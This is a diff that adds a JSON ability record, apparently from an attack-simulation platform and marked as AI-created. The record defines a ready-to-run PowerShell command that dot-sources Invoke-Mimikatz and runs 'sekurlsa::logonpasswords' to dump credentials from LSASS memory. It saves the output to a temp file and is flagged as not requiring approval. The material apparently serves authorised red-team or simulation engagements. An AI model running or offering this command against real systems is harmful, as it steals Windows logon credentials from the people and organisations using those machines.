@@ -1,0 +1,31 @@
+{
+  "ability_id": "984838cc-e8cc-4492-84a1-06bb4a3ed07a",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-24T07:55:12.509758+00:00",
+  "ability": {
+    "name": "LSASS Credential Extraction via Invoke-Mimikatz",
+    "description": "Dot-sources and runs Invoke-Mimikatz to extract credentials from LSASS memory if operating with administrative privileges.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1003.001",
+    "platform": "windows",
+    "impact_type": null,
+    "default_severity": null,
+    "requires_approval": false,
+    "tags": null,
+    "created_by": "ai",
+    "engagement_id": "2b46bea0854443f1a134f53563af2133"
+  },
+  "stages": [
+    {
+      "stage_name": "Execute Invoke-Mimikatz",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:/Windows/Temp/bas'; if(!(Test-Path $d)){ni -ItemType Directory -Force $d|out-null}; $(try { $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { . .\\Invoke-Mimikatz.ps1; Invoke-Mimikatz -Command \"privilege::debug sekurlsa::logonpasswords exit\" } else { Write-Output \"ERROR: Non-admin session. Skipping LSASS dump via Mimikatz.\" } } catch { $_ }) | Tee-Object -FilePath $d/mimikatz.txt",
+      "timeout_seconds": 900,
+      "payload_id": "1c71cf2c-533e-4cdf-8cc0-c10e54918309"
+    }
+  ],
+  "rationale": "Correctly references and dot-sources the pre-uploaded Invoke-Mimikatz.ps1 payload without jumping straight to raw execution. It omits comsvcs from the plan to strictly avoid concurrently running LSASS dumping tools in a single execution loop.",
+  "provider": "Mimikatz",
+  "cited_urls": []
+}
